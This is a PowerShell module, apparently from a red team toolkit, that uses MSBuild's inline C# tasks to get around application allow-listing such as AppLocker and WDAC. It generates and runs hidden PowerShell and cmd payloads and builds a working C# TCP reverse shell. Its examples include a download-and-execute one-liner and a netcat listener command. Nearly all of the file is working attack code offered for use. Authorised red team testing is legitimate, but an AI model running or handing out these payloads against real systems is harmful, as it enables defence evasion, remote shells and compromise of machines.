<#
.SYNOPSIS
    Execute code via MSBuild to bypass application whitelisting

.DESCRIPTION
    MSBuild.exe is a Microsoft-signed binary used for building .NET projects.
    It can execute inline C# code within XML project files, bypassing
    application whitelisting that allows MSBuild.

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER Command
    PowerShell command to execute

.PARAMETER PayloadPath
    Path to custom MSBuild XML payload

.PARAMETER OutputPath
    Path to save generated payload (for review/modification)

.EXAMPLE
    Invoke-MSBuildBypass -Command "Get-Process"
    Invoke-MSBuildBypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')"
#>

function Invoke-MSBuildBypass {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'Command')]
        [string]$Command,

        [Parameter(ParameterSetName = 'File')]
        [string]$PayloadPath,

        [string]$OutputPath
    )

    Write-Host @"

============================================================
  MSBUILD APPLICATION WHITELISTING BYPASS
============================================================
  MSBuild.exe can execute inline C# code from XML files.
  This bypasses AppLocker, WDAC, and similar controls.
============================================================

"@ -ForegroundColor Cyan

    # Find MSBuild
    $msbuildPaths = @(
        "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
        "C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
        "C:\Windows\Microsoft.NET\Framework64\v3.5\MSBuild.exe",
        "C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe"
    )

    $msbuild = $msbuildPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

    if (-not $msbuild) {
        Write-Error "MSBuild.exe not found"
        return
    }

    Write-Host "[+] Using: $msbuild" -ForegroundColor Green

    if ($PayloadPath) {
        if (-not (Test-Path $PayloadPath)) {
            Write-Error "Payload file not found: $PayloadPath"
            return
        }

        Write-Host "[*] Executing payload: $PayloadPath" -ForegroundColor Yellow
        & $msbuild $PayloadPath
    }
    else {
        # Generate payload
        $xmlPayload = New-MSBuildPayload -Command $Command

        # Save to temp file
        $tempPath = Join-Path $env:TEMP "build_$(Get-Random).xml"
        $xmlPayload | Out-File $tempPath -Encoding UTF8

        if ($OutputPath) {
            Copy-Item $tempPath $OutputPath
            Write-Host "[+] Payload saved to: $OutputPath" -ForegroundColor Green
        }

        Write-Host "[*] Executing MSBuild payload..." -ForegroundColor Yellow

        try {
            & $msbuild $tempPath
        }
        finally {
            # Cleanup
            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
        }
    }
}

function New-MSBuildPayload {
    <#
    .SYNOPSIS
        Generate MSBuild XML payload with embedded C# code

    .EXAMPLE
        $payload = New-MSBuildPayload -Command "Get-Process"
        $payload | Out-File C:\temp\payload.xml
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Command,

        [ValidateSet('PowerShell', 'Cmd', 'Custom')]
        [string]$Type = 'PowerShell',

        [string]$CustomCode
    )

    # Escape special characters for C#
    $escapedCommand = $Command -replace '\\', '\\\\' -replace '"', '\"'

    $csharpCode = switch ($Type) {
        'PowerShell' {
            @"
using System;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class NativeRedTask : Task
{
    public override bool Execute()
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoProfile -WindowStyle Hidden -Command \"$escapedCommand\"";
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;

            Process proc = Process.Start(psi);
            string output = proc.StandardOutput.ReadToEnd();
            string error = proc.StandardError.ReadToEnd();
            proc.WaitForExit();

            if (!string.IsNullOrEmpty(output))
                Console.WriteLine(output);
            if (!string.IsNullOrEmpty(error))
                Console.WriteLine("Error: " + error);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Exception: " + ex.Message);
        }
        return true;
    }
}
"@
        }
        'Cmd' {
            @"
using System;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class NativeRedTask : Task
{
    public override bool Execute()
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c $escapedCommand";
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        Process.Start(psi);
        return true;
    }
}
"@
        }
        'Custom' {
            $CustomCode
        }
    }

    $xmlPayload = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- Native Windows Red Team Toolkit - MSBuild Bypass -->
  <Target Name="Execute">
    <NativeRedTask />
  </Target>
  <UsingTask
    TaskName="NativeRedTask"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
$csharpCode
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"@

    return $xmlPayload
}

function New-MSBuildReverseShell {
    <#
    .SYNOPSIS
        Generate MSBuild payload for reverse shell

    .EXAMPLE
        New-MSBuildReverseShell -IP 192.168.1.100 -Port 4444 -OutputPath C:\temp\shell.xml
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$IP,

        [Parameter(Mandatory)]
        [int]$Port,

        [Parameter(Mandatory)]
        [string]$OutputPath
    )

    $shellCode = @"
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class NativeRedTask : Task
{
    public override bool Execute()
    {
        try
        {
            using (TcpClient client = new TcpClient("$IP", $Port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    using (StreamWriter writer = new StreamWriter(stream))
                    {
                        writer.AutoFlush = true;
                        writer.WriteLine("MSBuild Shell Connected: " + Environment.MachineName);

                        while (true)
                        {
                            writer.Write("PS> ");
                            string command = reader.ReadLine();

                            if (string.IsNullOrEmpty(command)) break;
                            if (command.ToLower() == "exit") break;

                            ProcessStartInfo psi = new ProcessStartInfo();
                            psi.FileName = "powershell.exe";
                            psi.Arguments = "-NoProfile -Command " + command;
                            psi.UseShellExecute = false;
                            psi.RedirectStandardOutput = true;
                            psi.RedirectStandardError = true;
                            psi.CreateNoWindow = true;

                            Process proc = Process.Start(psi);
                            string output = proc.StandardOutput.ReadToEnd();
                            string error = proc.StandardError.ReadToEnd();
                            proc.WaitForExit();

                            writer.WriteLine(output);
                            if (!string.IsNullOrEmpty(error))
                                writer.WriteLine("Error: " + error);
                        }
                    }
                }
            }
        }
        catch (Exception) { }
        return true;
    }
}
"@

    $payload = New-MSBuildPayload -Type Custom -CustomCode $shellCode -Command ""
    $payload | Out-File $OutputPath -Encoding UTF8

    Write-Host "[+] Reverse shell payload saved to: $OutputPath" -ForegroundColor Green
    Write-Host "[*] Start listener: nc -lvp $Port" -ForegroundColor Yellow
    Write-Host "[*] Execute: MSBuild.exe $OutputPath" -ForegroundColor Yellow
}

# Export functions
Export-ModuleMember -Function Invoke-MSBuildBypass, New-MSBuildPayload, New-MSBuildReverseShell
